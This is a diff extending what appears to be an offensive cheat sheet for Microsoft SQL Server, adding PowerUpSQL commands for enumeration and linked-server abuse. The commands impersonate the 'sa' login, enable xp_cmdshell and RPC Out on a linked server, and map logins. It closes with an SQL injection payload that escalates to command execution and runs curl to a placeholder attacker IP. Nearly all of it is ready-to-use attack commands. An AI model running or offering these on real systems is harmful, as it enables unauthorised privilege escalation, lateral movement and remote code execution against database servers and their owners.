@@ -76,3 +76,80 @@ Or, use Nmap to execute xp\_cmdshell:
 nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password='p@ssw0rd',ms-sql-xp-cmdshell.cmd="ipconfig" 10.10.10.1
 ```
 {% endcode %}
+
+## PowerUpSQL Stuff
+
+### Check Instance
+
+```bash
+get-sqlinstancelocal
+get-sqlinstancedomain
+Get-SQLConnectionTest -Instance "sql03.zerobyte.id,1433"
+```
+
+### Get SQL Instance Info
+
+```
+get-sqlserverinfo -instance "WEB06\SQLEXPRESS"
+```
+
+### Check Database Links
+
+{% code overflow="wrap" %}
+```bash
+# AT Command
+get-sqlquery -instance "WEB06\SQLEXPRESS" -query "execute as login ='sa'; EXEC ('sp_linkedservers') at SQL03" -Verbose
+```
+{% endcode %}
+
+### Create or Update Login Mapping
+
+{% code overflow="wrap" %}
+```bash
+get-sqlquery -instance "WEB06\SQLEXPRESS" -query "EXEC sp_addlinkedsrvlogin 'SQL27', true;" - Verbose
+```
+{% endcode %}
+
+### Check user can be impersonated
+
+{% code overflow="wrap" %}
+```bash
+Get-SQLQuery -Instance 'WEB06\SQLEXPRESS' -query "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"
+```
+{% endcode %}
+
+### Enable xp\_cmdshell
+
+On local instance
+
+{% code overflow="wrap" %}
+```bash
+get-sqlquery -query "execute as login ='sa'; EXEC sp_configure 'show advanced options', '1'; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE; EXEC('xp_cmdshell ''whoami'';" -Verbose
+```
+{% endcode %}
+
+AT command
+
+{% code overflow="wrap" %}
+```bash
+get-sqlquery -instance "WEB06\SQLEXPRESS" -query "EXECUTE AS LOGIN = 'sa'; EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE; REVERT;') AT SQL03;" -Verbose
+```
+{% endcode %}
+
+### Enable RPC Out
+
+{% code overflow="wrap" %}
+```bash
+Get-SQLQuery -instance "WEB06\SQLEXPRESS" -query "execute as login ='sa'; exec sp_serveroption 'SQL03', 'rpc out', 'true';" - Verbose
+```
+{% endcode %}
+
+## SQL Injection Payload
+
+SQLi to RCE
+
+{% code overflow="wrap" %}
+```bash
+1'; EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', '1'; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE; EXEC xp_cmdshell 'curl http://192.168.x.x:8088/'; --
+```
+{% endcode %}
